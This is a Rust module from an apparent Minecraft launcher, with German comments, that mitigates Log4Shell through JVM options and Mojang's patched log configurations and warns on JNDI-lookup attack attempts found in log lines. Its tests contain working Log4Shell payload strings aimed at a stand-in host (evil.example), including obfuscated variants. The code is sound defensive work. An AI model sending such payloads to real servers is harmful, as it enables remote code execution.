//! Log4Shell-Schutz (CVE-2021-44228 / CVE-2021-45046) für Spiel und lokale Server.
//!
//! - Client: Mojangs `logging.client`-Konfiguration aus der Versions-JSON (siehe `install.rs`/`launch.rs`)
//!   plus immer `-Dlog4j2.formatMsgNoLookups=true` (Defense in depth).
//! - Server: immer die JVM-Option; für 1.7–1.16.5 zusätzlich Mojangs gepatchte Server-Log-Konfiguration
//!   (Sicherheitshinweis vom 10.12.2021), außer der Nutzer setzt selbst `-Dlog4j.configurationFile`.
//! - Erkennung: `${jndi:` (auch verschachtelt/verschleiert) in einer Logzeile → Warnung im Launcher-Log.
//!
//! Siehe docs/LOG4SHELL.md.
use std::path::{Path, PathBuf};

use crate::error::AppResult;

/// Schaltet Message-Lookups in Log4j 2.10+ ab. Ältere Log4j-Versionen (MC 1.7–1.11) ignorieren die Option –
/// dort hilft nur die gepatchte Konfiguration mit `%msg{nolookups}`.
pub const NO_LOOKUPS: &str = "-Dlog4j2.formatMsgNoLookups=true";
const CONFIG_PROP: &str = "-Dlog4j.configurationFile=";

/// Wie eine Minecraft-Version geschützt werden muss.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Exposure {
    /// Vor 1.7 (kein Log4j 2) – nichts nötig.
    Unaffected,
    /// 1.7–1.11.2: Log4j 2.0-beta9 – gepatchte Konfiguration `log4j2_17-111.xml` nötig.
    Legacy,
    /// 1.12–1.16.5: gepatchte Konfiguration `log4j2_112-116.xml`.
    Mid,
    /// 1.17–1.18.0: JVM-Option reicht.
    JvmOption,
    /// Ab 1.18.1 (Log4j 2.15+/2.17) – behoben.
    Fixed,
}

impl Exposure {
    /// Braucht ohne Gegenmaßnahme Schutz (für Warnungen).
    pub fn vulnerable(self) -> bool {
        !matches!(self, Exposure::Unaffected | Exposure::Fixed)
    }
}

/// Mojangs gepatchte Server-Log-Konfiguration.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct MojangConfig {
    pub file: &'static str,
    pub url: &'static str,
    pub sha1: &'static str,
    pub size: u64,
    /// Mitgelieferte Kopie (identisch, SHA1 geprüft) – falls der Download scheitert (offline)
    pub bundled: &'static [u8],
}

/// Offizielle Dateien aus Mojangs Sicherheitshinweis (minecraft.net, „Important Message: Security vulnerability in
/// Java Edition“, Dezember 2021). SHA1 = Objekt-ID im Pfad, nachgeprüft am 21.11.2026.
pub const CONFIG_17_111: MojangConfig = MojangConfig {
    file: "log4j2_17-111.xml",
    url: "https://launcher.mojang.com/v1/objects/4bb89a97a66f350bc9f73b3ca8509632682aea2e/log4j2_17-111.xml",
    sha1: "4bb89a97a66f350bc9f73b3ca8509632682aea2e",
    size: 1219,
    bundled: include_bytes!("log4shell/log4j2_17-111.xml"),
};
pub const CONFIG_112_116: MojangConfig = MojangConfig {
    file: "log4j2_112-116.xml",
    url: "https://launcher.mojang.com/v1/objects/02937d122c86ce73319ef9975b58896fc1b491d1/log4j2_112-116.xml",
    sha1: "02937d122c86ce73319ef9975b58896fc1b491d1",
    size: 1131,
    bundled: include_bytes!("log4shell/log4j2_112-116.xml"),
};

/// Release-Version `1.x[.y]` (auch `1.16.5-pre1`, `1.12.2-forge-…`, `fabric-loader-…-1.16.5`) zerlegen.
fn parse_release(v: &str) -> Option<(u32, u32)> {
    let v = v.trim();
    // Erste `1.x`-Gruppe, die nicht Teil einer anderen Zahl ist (Loader-IDs wie `fabric-loader-0.14.21-1.16.5`)
    let start = v.match_indices("1.").map(|(i, _)| i).find(|&i| i == 0 || !v.as_bytes()[i - 1].is_ascii_alphanumeric() && v.as_bytes()[i - 1] != b'.')?;
    let rest = &v[start + 2..];
    let mut parts = rest.split(|c: char| !c.is_ascii_digit());
    let minor: u32 = parts.next()?.parse().ok()?;
    let after = &rest[minor.to_string().len()..];
    let patch = after.strip_prefix('.').and_then(|p| p.split(|c: char| !c.is_ascii_digit()).next()).and_then(|p| p.parse().ok()).unwrap_or(0);
    Some((minor, patch))
}

/// Wochen-Snapshot `21w44a` → (Jahr, Woche).
fn parse_snapshot(v: &str) -> Option<(u32, u32)> {
    let b = v.trim().as_bytes();
    if b.len() >= 6 && b[..2].iter().all(u8::is_ascii_digit) && b[2] == b'w' && b[3..5].iter().all(u8::is_ascii_digit) {
        let s = std::str::from_utf8(b).ok()?;
        return Some((s[..2].parse().ok()?, s[3..5].parse().ok()?));
    }
    None
}

pub fn exposure(mc: &str) -> Exposure {
    if let Some((year, week)) = parse_snapshot(mc) {
        // 13w… (1.7-Snapshots ab 13w38) bis 21w… ; 1.18.1 erschien in KW 50/2021
        return match (year, week) {
            (y, _) if y < 13 => Exposure::Unaffected,
            (13, w) if w < 38 => Exposure::Unaffected,
            (y, _) if y < 17 => Exposure::Legacy,
            (20, w) if w >= 45 => Exposure::JvmOption,
            (y, _) if y < 21 => Exposure::Mid,
            (21, w) if w < 50 => Exposure::JvmOption,
            _ => Exposure::Fixed,
        };
    }
    match parse_release(mc) {
        Some((minor, _)) if minor < 7 => Exposure::Unaffected,
        Some((minor, _)) if minor <= 11 => Exposure::Legacy,
        Some((minor, _)) if minor <= 16 => Exposure::Mid,
        Some((17, _)) | Some((18, 0)) => Exposure::JvmOption,
        Some(_) => Exposure::Fixed,
        // Unbekanntes Format: vorsichtshalber nur die (harmlose) JVM-Option
        None => Exposure::JvmOption,
    }
}

/// Passende Mojang-Server-Konfiguration für eine Version.
pub fn server_config(mc: &str) -> Option<MojangConfig> {
    match exposure(mc) {
        Exposure::Legacy => Some(CONFIG_17_111),
        Exposure::Mid => Some(CONFIG_112_116),
        _ => None,
    }
}

/// Setzt der Nutzer schon eine eigene Log4j-Konfiguration?
pub fn has_own_config(args: &[String]) -> bool {
    args.iter().any(|a| a.starts_with(CONFIG_PROP) || a.starts_with("-Dlog4j2.configurationFile="))
}

/// Zusätzliche JVM-Argumente für den Server (vor `-jar`). `user` = schon gesetzte Argumente.
pub fn server_args(user: &[String], config: Option<&Path>) -> Vec<String> {
    let mut out = Vec::new();
    if !user.iter().any(|a| a.starts_with("-Dlog4j2.formatMsgNoLookups")) {
        out.push(NO_LOOKUPS.to_string());
    }
    if let Some(p) = config.filter(|_| !has_own_config(user)) {
        out.push(format!("{CONFIG_PROP}{}", p.to_string_lossy()));
    }
    out
}

/// Mojangs Konfiguration (mit SHA1-Prüfung) in den Cache laden; `None`, wenn für die Version keine nötig ist.
pub async fn ensure_server_config(net: &crate::net::Net, dir: &Path, mc: &str) -> AppResult<Option<PathBuf>> {
    let Some(c) = server_config(mc) else { return Ok(None) };
    let path = dir.join(c.file);
    let item = crate::net::DownloadItem::new(c.url, path.clone()).sha1(Some(c.sha1)).size(Some(c.size));
    if crate::net::Net::is_valid(&item).await {
        return Ok(Some(path));
    }
    if let Err(e) = net.download(&item, None, None).await {
        // Offline o. Ä.: mitgelieferte Kopie verwenden (gleiche Datei, gleicher Hash)
        tracing::warn!("Log4j-Konfiguration {} nicht ladbar ({e}) – nutze mitgelieferte Kopie", c.file);
        if sha1_hex(c.bundled) != c.sha1 {
            return Err(crate::error::AppError::msg("Mitgelieferte Log4j-Konfiguration beschädigt"));
        }
        tokio::fs::create_dir_all(dir).await?;
        tokio::fs::write(&path, c.bundled).await?;
    }
    Ok(Some(path))
}

fn sha1_hex(b: &[u8]) -> String {
    use sha1::{Digest, Sha1};
    hex::encode(Sha1::digest(b))
}

/// Ein erkannter Log4Shell-Versuch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Attempt {
    /// Spielername, falls aus der Zeile ablesbar
    pub player: Option<String>,
    /// Ziel der Lookup-URL (z. B. `ldap://evil.example:1389`), entschärft
    pub target: Option<String>,
}

impl Attempt {
    pub fn message(&self) -> String {
        let who = match &self.player {
            Some(p) => format!("Spieler „{p}“"),
            None => "unbekannter Quelle".to_string(),
        };
        let target = self.target.as_ref().map(|t| format!(" (Ziel: {t})")).unwrap_or_default();
        format!(
            "⚠ Möglicher Log4Shell-Angriffsversuch von {who}{target}: Eine Logzeile enthält einen JNDI-Lookup. \
             Der Launcher-Schutz ist aktiv, die Zeile wird nicht ausgeführt – den Absender am besten bannen."
        )
    }
}

/// Lookups entfernen, mit denen `${jndi:` verschleiert wird (`${lower:j}`, `${::-n}`, `${env:X:-d}` …).
fn deobfuscate(s: &str) -> String {
    use regex::Regex;
    use std::sync::OnceLock;
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| Regex::new(r"\$\{(?:[a-zA-Z]*:)*-?([^${}:]*)\}").expect("regex"));
    let mut cur = s.to_string();
    for _ in 0..8 {
        let next = re.replace_all(&cur, |c: &regex::Captures| {
            let inner = &c[0];
            // `${jndi:…}` selbst nicht auflösen
            if inner.to_ascii_lowercase().starts_with("${jndi:") {
                return inner.to_string();
            }
            c[1].to_string()
        });
        if next == cur {
            break;
        }
        cur = next.into_owned();
    }
    cur
}

/// Prüft eine Logzeile auf einen Log4Shell-Versuch.
pub fn detect(line: &str) -> Option<Attempt> {
    if !line.contains("${") {
        return None;
    }
    let plain = deobfuscate(line);
    let lower = plain.to_ascii_lowercase();
    let at = lower.find("${jndi:")?;
    let target = {
        let rest = &plain[at + 7..];
        let end = rest.find(['}', ' ', '"', '\'']).unwrap_or(rest.len());
        let t: String = rest[..end].chars().filter(|c| !c.is_control()).take(120).collect();
        // `${` aus dem Ziel entfernen, damit die Warnung selbst nie einen Lookup enthält
        Some(t.replace("${", "").replace('$', "")).filter(|t| !t.is_empty())
    };
    Some(Attempt { player: player_of(line), target })
}

fn player_of(line: &str) -> Option<String> {
    use regex::Regex;
    use std::sync::OnceLock;
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| {
        Regex::new(r"(?:<(?:\[[^\]]*\] )?([A-Za-z0-9_]{1,16})>|(?:^|: )([A-Za-z0-9_]{1,16}) (?:\(/|lost connection|issued server command|tried command))").expect("regex")
    });
    let c = re.captures(line)?;
    c.get(1).or(c.get(2)).map(|m| m.as_str().to_string())
}

/// Meldet Versuche je Lesestrom höchstens `LIMIT`-mal einzeln (Schutz vor Log-Flut).
#[derive(Debug, Default)]
pub struct Watch {
    count: u32,
}

impl Watch {
    const LIMIT: u32 = 10;

    /// Warnungen für eine Zeile (leer = nichts gefunden oder schon zu viele gemeldet).
    pub fn check(&mut self, line: &str) -> Vec<String> {
        let Some(a) = detect(line) else { return Vec::new() };
        self.count += 1;
        tracing::warn!(player = ?a.player, target = ?a.target, "möglicher Log4Shell-Angriffsversuch erkannt");
        match self.count {
            n if n < Self::LIMIT => vec![a.message()],
            n if n == Self::LIMIT => {
                vec![a.message(), "Weitere Log4Shell-Versuche in dieser Sitzung werden nicht mehr einzeln gemeldet.".into()]
            }
            _ => Vec::new(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ranges() {
        assert_eq!(exposure("1.6.4"), Exposure::Unaffected);
        assert_eq!(exposure("1.7.10"), Exposure::Legacy);
        assert_eq!(exposure("1.11.2"), Exposure::Legacy);
        assert_eq!(exposure("1.12"), Exposure::Mid);
        assert_eq!(exposure("1.12.2"), Exposure::Mid);
        assert_eq!(exposure("1.16.5"), Exposure::Mid);
        assert_eq!(exposure("1.16.5-rc1"), Exposure::Mid);
        assert_eq!(exposure("1.17"), Exposure::JvmOption);
        assert_eq!(exposure("1.17.1"), Exposure::JvmOption);
        assert_eq!(exposure("1.18"), Exposure::JvmOption);
        assert_eq!(exposure("1.18-pre1"), Exposure::JvmOption);
        assert_eq!(exposure("1.18.1"), Exposure::Fixed);
        assert_eq!(exposure("1.18.2"), Exposure::Fixed);
        assert_eq!(exposure("1.21.4"), Exposure::Fixed);
        assert_eq!(exposure("21w44a"), Exposure::JvmOption);
        assert_eq!(exposure("20w14a"), Exposure::Mid);
        assert_eq!(exposure("20w45a"), Exposure::JvmOption);
        assert_eq!(exposure("16w02a"), Exposure::Legacy);
        assert_eq!(exposure("22w03a"), Exposure::Fixed);
        assert_eq!(exposure("1.12.2-forge-14.23.5.2860"), Exposure::Mid);
        assert_eq!(exposure("fabric-loader-0.14.21-1.16.5"), Exposure::Mid);
        assert_eq!(exposure("unbekannt"), Exposure::JvmOption);
        assert!(exposure("1.8.9").vulnerable());
        assert!(!exposure("1.20.1").vulnerable());
    }

    #[test]
    fn configs() {
        assert_eq!(server_config("1.8.9"), Some(CONFIG_17_111));
        assert_eq!(server_config("1.16.5"), Some(CONFIG_112_116));
        assert_eq!(server_config("1.17.1"), None);
        assert_eq!(server_config("1.20.1"), None);
        assert!(CONFIG_17_111.url.contains(CONFIG_17_111.sha1) && CONFIG_17_111.url.ends_with(CONFIG_17_111.file));
        for c in [CONFIG_17_111, CONFIG_112_116] {
            assert_eq!(sha1_hex(c.bundled), c.sha1, "{}", c.file);
            assert_eq!(c.bundled.len() as u64, c.size);
            let xml = std::str::from_utf8(c.bundled).unwrap();
            // 1.12–1.16.5: `%msg{nolookups}`; 1.7–1.11.2: RegexFilter verwirft Zeilen mit `${…}` ganz
            assert!(xml.contains("%msg{nolookups}") || xml.contains("RegexFilter"), "{}", c.file);
        }
        assert!(CONFIG_112_116.url.contains(CONFIG_112_116.sha1) && CONFIG_112_116.url.ends_with(CONFIG_112_116.file));
    }

    #[test]
    fn args() {
        let p = Path::new("/c/log4j2_112-116.xml");
        assert_eq!(server_args(&[], Some(p)), vec![NO_LOOKUPS.to_string(), "-Dlog4j.configurationFile=/c/log4j2_112-116.xml".to_string()]);
        assert_eq!(server_args(&[], None), vec![NO_LOOKUPS.to_string()]);
        // Eigene Config des Nutzers bleibt, nur die JVM-Option kommt dazu
        let own = vec!["-Dlog4j.configurationFile=mine.xml".to_string()];
        assert_eq!(server_args(&own, Some(p)), vec![NO_LOOKUPS.to_string()]);
        // Schon gesetzt → nichts doppelt
        let both = vec![NO_LOOKUPS.to_string(), "-Dlog4j.configurationFile=mine.xml".to_string()];
        assert!(server_args(&both, Some(p)).is_empty());
    }

    #[test]
    fn detects() {
        let a = detect("[12:00:00] [Server thread/INFO]: <Griefer> ${jndi:ldap://evil.example:1389/a}").unwrap();
        assert_eq!(a.player.as_deref(), Some("Griefer"));
        assert_eq!(a.target.as_deref(), Some("ldap://evil.example:1389/a"));
        assert!(a.message().contains("Griefer") && !a.message().contains("${"));
        // Groß/klein und verschleiert
        assert!(detect("[Not Secure] <Bob> ${JNDI:rmi://x}").is_some());
        let b = detect("<Eve> ${${lower:j}${::-n}di:${lower:l}dap://h/x}").unwrap();
        assert_eq!(b.player.as_deref(), Some("Eve"));
        assert_eq!(b.target.as_deref(), Some("ldap://h/x"));
        assert!(detect("[Render thread/INFO]: [CHAT] ${jndi:dns://x}").is_some());
        // Harmlos
        let c = detect("[12:00:00 INFO]: Griefer (/1.2.3.4:5555) lost connection: ${jndi:ldap://x}").unwrap();
        assert_eq!(c.player.as_deref(), Some("Griefer"));
        assert!(detect("<Alex> hallo ${name} und jndi").is_none());
        assert!(detect("Done (3.2s)! For help, type \"help\"").is_none());
    }

    #[test]
    fn watch_limits() {
        let mut w = Watch::default();
        assert!(w.check("harmlos").is_empty());
        for _ in 0..9 {
            assert_eq!(w.check("<a> ${jndi:ldap://x}").len(), 1);
        }
        assert_eq!(w.check("<a> ${jndi:ldap://x}").len(), 2);
        assert!(w.check("<a> ${jndi:ldap://x}").is_empty());
    }
}
